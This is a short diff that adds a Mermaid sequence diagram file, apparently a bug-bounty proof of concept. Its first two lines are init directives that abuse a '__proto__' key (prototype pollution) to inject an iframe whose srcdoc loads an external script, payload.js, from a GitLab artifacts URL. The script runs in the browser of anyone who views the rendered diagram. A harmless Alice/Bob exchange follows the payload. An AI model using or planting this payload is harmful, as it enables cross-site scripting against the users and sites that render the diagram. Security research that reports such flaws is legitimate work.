@@ -1,0 +1,5 @@
+%%{init: { '__proto__': {'template': '<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\">'}} }%%
+%%{init: { '__proto__': {'template': '<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\">'}} }%%
+sequenceDiagram
+Alice->>Bob: Hi Bob
+Bob->>Alice: Hi Alice
